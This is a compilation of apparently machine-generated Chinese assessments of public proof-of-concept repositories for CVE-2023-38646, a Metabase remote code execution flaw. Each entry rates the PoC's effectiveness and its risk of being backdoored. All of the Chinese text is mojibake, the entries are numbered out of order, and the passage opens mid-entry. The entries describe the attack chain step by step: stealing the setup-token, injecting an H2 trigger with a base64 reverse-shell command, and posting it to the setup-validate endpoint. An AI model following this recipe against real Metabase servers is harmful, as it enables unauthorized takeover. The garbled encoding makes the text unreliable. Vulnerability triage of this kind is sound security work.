**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªæˆæƒçš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1, < 1.46.6.1 (åŠå…¶ä»–ä¿®å¤ç‰ˆæœ¬è§æ¼æ´åº“ä¿¡æ¯)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚ä¿®å¤ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆé€šè¿‡è®¿é—® `/api/session/properties` ç«¯ç‚¹è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„ Payloadï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å‘½ä»¤çš„ JSON payloadã€‚è¯¥ payload åˆ©ç”¨ H2 æ•°æ®åº“çš„ä¸€ä¸ªç‰¹æ€§ï¼Œé€šè¿‡åˆ›å»ºè§¦å‘å™¨åœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚è¯¥ JavaScript ä»£ç ä¼šæ‰§è¡Œ bash å‘½ä»¤ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **å‘é€ Payloadï¼š** æ”»å‡»è€…å°†æ„é€ çš„ payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚åˆ©ç”¨ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç ï¼Œç»•è¿‡æ£€æµ‹ã€‚

**POC ä»£ç æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ POC ä»£ç ä¼¼ä¹æœ‰æ•ˆï¼Œå› ä¸ºå®ƒå®ç°äº†ä¸Šè¿°åˆ©ç”¨è¿‡ç¨‹ã€‚å®ƒé¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªåŒ…å«åå‘ shell å‘½ä»¤çš„ payloadï¼Œå¹¶å°†å…¶å‘é€åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥å­˜å‚¨åº“çš„ä¸»è¦ä»£ç æ–‡ä»¶æ˜¯ `exploit.py`ã€‚ä»”ç»†æ£€æŸ¥æ­¤æ–‡ä»¶ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç æˆ–åé—¨ã€‚è¯¥è„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨ CVE-2023-38646 æ¼æ´ï¼Œå…è®¸è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ ä½†æ˜¯ç”±äºè¯¥æ¼æ´æœ¬èº«å°±å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç ï¼Œä½œè€…å¦‚æœå°†åå¼¹shellçš„IPæˆ–è€…ç«¯å£å†™æ­»ï¼Œå°±æœ‰å¯èƒ½è¢«ä½œè€…æ§åˆ¶ã€‚
`README.md` æ–‡ä»¶ä»…åŒ…å«æœ‰å…³æ¼æ´å’Œä½¿ç”¨è„šæœ¬çš„è¯´æ˜ã€‚å®ƒè¿˜åŒ…å«å¯¹åŸå§‹æ¼æ´å‘ç°å’Œç›¸å…³æ¼æ´åˆ©ç”¨çš„ credit é“¾æ¥ï¼Œè¿™è¡¨æ˜ä½œè€…æ²¡æœ‰è¯•å›¾éšè—è„šæœ¬çš„ç›®çš„ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’çš„æ¦‚ç‡è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [passwa11/CVE-2023-38646](https://github.com/passwa11/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #25

**æ¥æº**: [CVE-2023-38646-securezeron_CVE-2023-38646.md](../2023/CVE-2023-38646-securezeron_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªæˆæƒè¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:** ç¬¬ä¸€ä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-POC.py`ï¼‰ç”¨äºè·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚å®ƒå°è¯•é€šè¿‡HTTPå’ŒHTTPSè¿æ¥åˆ°ç›®æ ‡IPåœ°å€ï¼Œå¹¶è¯·æ±‚`/api/session/properties`ç«¯ç‚¹ï¼Œè§£æè¿”å›çš„JSONæ•°æ®ï¼Œä»ä¸­æå–`setup-token`ã€‚
2.  **åˆ©ç”¨Setup Tokenæ‰§è¡Œå‘½ä»¤ï¼š** ç¬¬äºŒä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-Reverse-Shell.py`ï¼‰åˆ©ç”¨è·å–åˆ°çš„Setup Tokenï¼Œå‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®ã€‚è¯¥é…ç½®ä½¿ç”¨H2æ•°æ®åº“å¼•æ“ï¼Œå¹¶åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ³¨å…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨`pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œä¹‹å‰è§¦å‘ï¼Œä»è€Œæ‰§è¡ŒBase64ç¼–ç çš„payloadï¼Œpayloadè§£ç åæ‰§è¡Œåå‘shellå‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

ä»æä¾›çš„æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’ŒPOCä»£ç æ¥çœ‹ï¼Œè¯¥æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æœç´¢ç»“æœä¸­åŒ…å«äº†å¤šä¸ªå…³äºæ­¤æ¼æ´çš„æè¿°ã€åˆ©ç”¨æ–¹æ³•ä»¥åŠPOCä»£ç çš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

*   ç¬¬ä¸€ä¸ªè„šæœ¬`CVE-2023-38646-POC.py`åªæ˜¯ç”¨æ¥è·å–setup tokenï¼Œæœ¬èº«ä¸åŒ…å«ä»»ä½•æ¶æ„ä»£ç ã€‚
*   ç¬¬äºŒä¸ªè„šæœ¬`CVE-2023-38646-Reverse-Shell.py`åŒ…å«åå‘shellçš„payloadï¼Œè¿™éƒ¨åˆ†æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆï¼Œä¸èƒ½ç®—ä½œæŠ•æ¯’ä»£ç ã€‚å¯èƒ½çš„æŠ•æ¯’é£é™©åœ¨äºï¼š
    *   **Payloadæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼š** è™½ç„¶å½“å‰Payloadæ˜¯åå‘shellï¼Œä½†æ”»å‡»è€…å¯èƒ½ä¿®æ”¹Payloadï¼Œæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼Œæ¯”å¦‚æ•°æ®çªƒå–ã€å‹’ç´¢è½¯ä»¶ç­‰ã€‚
    *   **ä¾èµ–é¡¹é£é™©ï¼š** è„šæœ¬ä¾èµ–requestsåº“ï¼Œå¦‚æœrequestsåº“æœ¬èº«è¢«æŠ•æ¯’ï¼Œå¯èƒ½å¼•å…¥å®‰å…¨é£é™©ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªè„šæœ¬æœ¬èº«ï¼Œæ¯”å¦‚åå‘shell çš„IPåœ°å€ã€ç«¯å£è¢«æ›¿æ¢æˆæ”»å‡»è€…æ§åˆ¶çš„è‚‰é¸¡ä»è€Œè¿›è¡Œè·³æ¿æ”»å‡»ï¼Œä»¥åŠå®‰è£…æ¶æ„ä¾èµ–é¡¹çš„å¯èƒ½ã€‚

æ€»ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯åˆ©ç”¨æœªæˆæƒçš„setupæ¥å£ï¼Œé€šè¿‡æ³¨å…¥æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [securezeron/CVE-2023-38646](https://github.com/securezeron/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #26

**æ¥æº**: [CVE-2023-38646-threatHNTR_CVE-2023-38646.md](../2023/CVE-2023-38646-threatHNTR_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ PoC ä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† Metabase å®‰è£…è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå³åœ¨è®¾ç½®è¿‡ç¨‹ä¸­å¯ä»¥æŒ‡å®šæ•°æ®åº“è¿æ¥ï¼Œå¹¶ä¸”æœªå¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²è¿›è¡Œå……åˆ†çš„éªŒè¯ã€‚é€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

*   è¯¥PoCé¦–å…ˆè·å– `setup-token` å’Œ Metabase ç‰ˆæœ¬ä¿¡æ¯ã€‚
*   ç„¶åï¼Œå¯¹åŒ…å«åå‘shellå‘½ä»¤çš„payloadè¿›è¡Œbase64ç¼–ç ã€‚
*   æ¥ç€ï¼Œå®ƒæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadï¼Œè¯¥å­—ç¬¦ä¸²åˆ©ç”¨äº†`CREATE TRIGGER` è¯­å¥å’Œå†…åµŒçš„JavaScriptä»£ç æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚
*   æœ€åï¼Œå®ƒå°†æ­¤payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œåå¼¹shellåˆ°æ”»å‡»è€…æ§åˆ¶çš„IPåœ°å€å’Œç«¯å£ã€‚

å‚è€ƒæœç´¢ç»“æœ [7] æä¾›äº† GitHub é“¾æ¥ï¼Œè¿›ä¸€æ­¥è¯å®äº† PoC çš„å­˜åœ¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è™½ç„¶PoCæœ¬èº«çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€å®šç¨‹åº¦çš„æŠ•æ¯’é£é™©ã€‚PoCä»£ç ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå¼¹shellçš„IPåœ°å€å’Œç«¯å£ã€‚å¦‚æœæ”»å‡»è€…æ¶æ„ä¿®æ”¹PoCä»£ç ï¼Œä¾‹å¦‚æ·»åŠ é¢å¤–çš„åé—¨æˆ–æ¶æ„åŠŸèƒ½ï¼Œå¹¶å°†å…¶ä¼ æ’­ç»™å…¶ä»–ç”¨æˆ·ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ›´å¤§èŒƒå›´çš„æ”»å‡»ã€‚é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **ä¾èµ–ç¬¬ä¸‰æ–¹åº“:** æ£€æŸ¥ PoC ä»£ç ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚
*   **Payloadä¿®æ”¹:** ç”¨æˆ·å¯èƒ½ç›´æ¥ä½¿ç”¨ PoC ä»£ç ï¼Œè€Œä¸æ£€æŸ¥å…¶å†…å®¹ã€‚æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ payloadï¼Œä¾‹å¦‚æ¤å…¥æŒ–çŸ¿ç¨‹åºæˆ–è€…å…¶ä»–æ¶æ„è½¯ä»¶ã€‚
*   **ç¤¾åŒºä¼ æ’­:** ä¿®æ”¹åçš„ PoC ä»£ç å¯èƒ½åœ¨å®‰å…¨ç¤¾åŒºä¸­ä¼ æ’­ï¼Œå¯¼è‡´æ›´å¤šç”¨æˆ·å—åˆ°å½±å“ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©å¤§çº¦ä¸º 10%ã€‚è¿™ä¸ªç™¾åˆ†æ¯”å¹¶ä¸é«˜ï¼Œå› ä¸ºå¤§å¤šæ•°å®‰å…¨ç ”ç©¶äººå‘˜ä¼šæ£€æŸ¥ä»£ç åå†ä½¿ç”¨ï¼Œä½†ä»ç„¶éœ€è¦è­¦æƒ•ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:**  åˆ©ç”¨ `/api/session/properties` ç«¯ç‚¹è·å– Metabase å®ä¾‹çš„ setup tokenã€‚
2.  **æ„é€ æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²:**  åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE TRIGGER`æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  **å‘é€è¯·æ±‚:**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
4.  **åå¼¹Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œç›®æ ‡ Metabase æœåŠ¡å™¨å°†åå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚
5.  **åˆ©ç”¨æœç´¢ç»“æœ** æœç´¢ç»“æœä¸­æåŠè¯¥æ¼æ´å¯èƒ½è¢«åˆ©ç”¨ (Web Attack: Metabase RCE Vulnerability CVE-2023-38646)ï¼Œå¹¶æä¾›äº†ç¼“è§£æªæ–½ï¼Œè¡¨æ˜è¯¥æ¼æ´åœ¨é‡å¤–å¯èƒ½è¢«åˆ©ç”¨ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   å°† Metabase å‡çº§åˆ°å—å½±å“ç‰ˆæœ¬ä»¥å¤–çš„ç‰ˆæœ¬ (>= 0.46.6.1 æˆ– >= 1.46.6.1)æˆ–å…¶ä»–ä¿®å¤ç‰ˆæœ¬ (0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2)ã€‚


**é¡¹ç›®åœ°å€:** [threatHNTR/CVE-2023-38646](https://github.com/threatHNTR/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #27

**æ¥æº**: [CVE-2023-38646-yxl2001_CVE-2023-38646.md](../2023/CVE-2023-38646-yxl2001_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 and < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Token:** é¦–å…ˆï¼Œåˆ©ç”¨`CVE-2023-38646-POC.py`è„šæœ¬ï¼Œé€šè¿‡è®¿é—®`/api/session/properties`æ¥å£æ¥è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚æ­¤æ­¥éª¤ç”¨äºåˆ¤æ–­ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œä»¥åŠè·å–åç»­åˆ©ç”¨æ‰€éœ€çš„tokenã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚:**  ä½¿ç”¨`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬ï¼Œè¯¥è„šæœ¬åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ `pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œï¼Œä»è€Œè§¦å‘ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è„šæœ¬å°†åå¼¹shellçš„bashå‘½ä»¤è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åå°†å…¶æ³¨å…¥åˆ°è§¦å‘å™¨ä¸­ã€‚
3.  **å‘é€ POST è¯·æ±‚:** å°†æ„é€ å¥½çš„åŒ…å«æ¶æ„ä»£ç çš„ JSON æ•°æ®é€šè¿‡ POST è¯·æ±‚å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚æ­¤è¯·æ±‚ä½¿ç”¨è·å–çš„ `setup-token` è¿›è¡ŒéªŒè¯ï¼Œå¹¶è§¦å‘ H2 æ•°æ®åº“è¿æ¥ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´çš„ POC ä»£ç æœ‰æ•ˆã€‚æœç´¢å¼•æ“ç»“æœä¹Ÿè¡¨æ˜å­˜åœ¨å…¬å¼€çš„ POC å¹¶ä¸”è¯¥æ¼æ´å·²è¢«ç§¯æåˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

`CVE-2023-38646-POC.py` è„šæœ¬åªæ˜¯ç”¨äºè·å– setup tokenï¼Œç›¸å¯¹å®‰å…¨ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ã€‚
`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬æœ¬èº«å®ç°äº†æ¼æ´åˆ©ç”¨ï¼Œä½†ä¸»è¦çš„åŠŸèƒ½æ˜¯å®ç°åå¼¹ shellã€‚ ä»£ç ä¸­å¯¹bashå‘½ä»¤è¿›è¡Œäº†base64ç¼–ç ,ä¸€å®šç¨‹åº¦ä¸Šå¢åŠ äº†ä»£ç é˜…è¯»çš„éš¾åº¦ã€‚å­˜åœ¨ä¸€å®šé£é™©ï¼š
    * ç¼–ç å¯èƒ½å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ï¼Œä¾‹å¦‚æ’å…¥é¢å¤–çš„å‘½ä»¤æˆ–ä¿®æ”¹åå¼¹ shell çš„è¡Œä¸ºã€‚å°½ç®¡ç›®å‰ä»£ç çœ‹ä¸Šå»æ˜¯å®ç°æ­£å¸¸çš„åå¼¹shellï¼Œä½†å­˜åœ¨è¢«ç¯¡æ”¹çš„å¯èƒ½æ€§ã€‚ä¾‹å¦‚ï¼Œåœ¨base64ç¼–ç å‰ååŠ å…¥æ¶æ„æŒ‡ä»¤ã€‚
    * è¯¥è„šæœ¬ä¾èµ–äºç›®æ ‡ç³»ç»Ÿä¸Šå­˜åœ¨ bash å’Œ base64 å‘½ä»¤ã€‚è™½ç„¶å¤§å¤šæ•° Linux ç³»ç»Ÿéƒ½åŒ…å«è¿™äº›å‘½ä»¤ï¼Œä½†åœ¨æŸäº›å—é™ç¯å¢ƒä¸­å¯èƒ½ä¸å­˜åœ¨ã€‚ä½œè€…æ¸…æ¥šè¿™ä¸€ç‚¹,ä½†å¹¶æœªå¯¹è¿™ç§æƒ…å†µè¿›è¡Œå¤„ç†,å®¹æ˜“é€ æˆè¯¯åˆ¤.
ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦çš„é£é™©é›†ä¸­åœ¨base64ç¼–ç å†…å®¹å¯èƒ½å­˜åœ¨è¢«ä¿®æ”¹æˆ–æ¤å…¥åé—¨çš„é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [yxl2001/CVE-2023-38646](https://github.com/yxl2001/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---



---

## POC #17

**æ¥æº**: [CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md](../2023/CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯¹å¤–å¼€æ”¾ï¼Œä¸”ç‰ˆæœ¬ä½äºå®‰å…¨ç‰ˆæœ¬ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœä»¥åŠæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥åšå‡ºä»¥ä¸‹åˆ¤æ–­ï¼š

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æœ‰æ•ˆã€‚ä»£ç åˆ©ç”¨äº† Metabase åœ¨è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´é€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„POCä»£ç ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥POCè„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œåå¼¹shellï¼Œå°†ç›®æ ‡æœºå™¨çš„shellåå¼¹åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPå’Œç«¯å£ã€‚ä¸»è¦é€»è¾‘éƒ½åœ¨æ„é€ payloadä¸Šï¼Œæ²¡æœ‰å‘ç°ä½œè€…éšè—çš„æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚è¿™ä¸ªtokenå¯ä»¥é€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å¾—ï¼Œè¯¥æ¥å£æ— éœ€èº«ä»½éªŒè¯ã€‚
2.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„ `payload`ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„ `payload` å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
